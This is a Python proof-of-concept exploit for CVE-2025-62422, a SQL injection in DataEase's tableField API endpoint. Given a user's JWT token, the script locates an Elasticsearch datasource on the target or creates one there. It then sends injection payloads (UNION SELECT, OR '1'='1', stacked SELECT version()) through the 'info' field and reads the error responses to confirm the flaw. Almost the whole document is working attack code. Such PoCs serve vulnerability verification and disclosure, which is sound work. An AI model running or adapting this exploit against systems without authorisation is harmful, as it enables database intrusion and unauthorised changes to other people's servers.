#!/usr/bin/env python3
"""
CVE-2025-62422 - DataEase SQL Injection PoC
Affected versions: <= 2.10.13
Fixed in: 2.10.14

The /de2api/datasetData/tableField interface is vulnerable to SQL injection.
An attacker can construct a malicious tableName parameter via the info field.

Requirements:
1. Valid authentication token
2. Elasticsearch datasource configured
3. Dataset created from ES datasource
"""

import sys
import json
import base64
import argparse
import requests

requests.packages.urllib3.disable_warnings()


class DataEaseExploit:
    def __init__(self, target, timeout=30):
        self.target = target.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        self.token = None
        self.datasource_id = None

    def set_token(self, token):
        self.token = token
        print(f"[+] Token set")

    def get_datasource_list(self):
        url = f"{self.target}/de2api/datasource/list"
        headers = {"X-DE-TOKEN": self.token}
        try:
            resp = self.session.get(url, headers=headers, timeout=self.timeout)
            if resp.status_code == 200:
                result = resp.json()
                if result.get("code") == 0:
                    return result.get("data", [])
        except Exception as e:
            print(f"[-] Error getting datasources: {e}")
        return []

    def get_es_datasource(self):
        datasources = self.get_datasource_list()
        for ds in datasources:
            if ds.get("type") == "es":
                self.datasource_id = ds.get("id")
                print(f"[+] Found ES datasource: {self.datasource_id} ({ds.get('name')})")
                return True
        return False

    def create_es_datasource(self, es_host="elasticsearch", es_port=9200):
        url = f"{self.target}/de2api/datasource/save"
        headers = {"X-DE-TOKEN": self.token, "Content-Type": "application/json"}
        config = {"url": f"http://{es_host}:{es_port}", "username": "", "password": "", "version": "7"}
        config_b64 = base64.b64encode(json.dumps(config).encode()).decode()
        data = {
            "name": "poc_es_datasource",
            "description": "PoC ES datasource",
            "type": "es",
            "configuration": config_b64
        }
        try:
            resp = self.session.post(url, headers=headers, json=data, timeout=self.timeout)
            if resp.status_code == 200:
                result = resp.json()
                if result.get("code") == 0 and result.get("data", {}).get("id"):
                    self.datasource_id = result["data"]["id"]
                    print(f"[+] Created ES datasource: {self.datasource_id}")
                    return True
                print(f"[-] Failed to create datasource: {result.get('msg', 'Unknown')}")
        except Exception as e:
            print(f"[-] Error creating datasource: {e}")
        return False

    def exploit_sqli(self, payload):
        if not self.datasource_id:
            return None

        url = f"{self.target}/de2api/datasetData/tableField"
        headers = {"X-DE-TOKEN": self.token, "Content-Type": "application/json"}
        
        info = json.dumps({"table": payload})
        data = {
            "datasourceId": self.datasource_id,
            "info": info,
            "type": "db",
            "isCross": False
        }
        
        try:
            return self.session.post(url, headers=headers, json=data, timeout=self.timeout)
        except Exception as e:
            print(f"[-] Request error: {e}")
            return None

    def check_vulnerability(self):
        print("[*] Testing SQL injection vulnerability...")
        
        sqli_payloads = [
            'testindex" UNION SELECT 1,2 --',
            "testindex' OR '1'='1",
            'testindex"; SELECT version() --'
        ]
        
        vulnerable = False
        
        for payload in sqli_payloads:
            print(f"\n[*] Testing payload: {payload}")
            resp = self.exploit_sqli(payload)
            
            if resp is None:
                continue
            
            print(f"[*] Response status: {resp.status_code}")
            
            response_text = resp.text.lower()
            
            if any(indicator in response_text for indicator in [
                "parsing_exception",
                "syntax error",
                "mismatched input",
                "select",
                "union"
            ]):
                print(f"[+] SQL INJECTION CONFIRMED!")
                print(f"[+] Response: {resp.text[:500]}")
                vulnerable = True
                break
            else:
                print(f"[*] Response: {resp.text[:200]}")
        
        return vulnerable

    def run(self, es_host="elasticsearch", token=None):
        print(f"[*] Target: {self.target}")
        print(f"[*] CVE-2025-62422 - DataEase SQL Injection PoC")
        print("-" * 50)
        
        if not token:
            print("[-] Token is required. Get it from browser localStorage (user.token)")
            return False
        
        self.set_token(token)
        
        if not self.get_es_datasource():
            print("[*] No ES datasource found, creating one...")
            if not self.create_es_datasource(es_host):
                print("[-] Failed to setup ES datasource")
                return False
        
        return self.check_vulnerability()


def main():
    parser = argparse.ArgumentParser(description="CVE-2025-62422 DataEase SQL Injection PoC")
    parser.add_argument("-t", "--target", required=True, help="Target URL (e.g., http://localhost:8100)")
    parser.add_argument("--token", required=True, help="JWT token from browser localStorage")
    parser.add_argument("--es-host", default="elasticsearch", help="ES host for datasource")
    parser.add_argument("--timeout", type=int, default=30, help="Request timeout")
    args = parser.parse_args()
    
    exploit = DataEaseExploit(args.target, args.timeout)
    
    if exploit.run(args.es_host, args.token):
        print("\n[+] Vulnerability verification completed!")
        sys.exit(0)
    else:
        print("\n[-] Vulnerability verification failed")
        sys.exit(1)


if __name__ == "__main__":
    main()
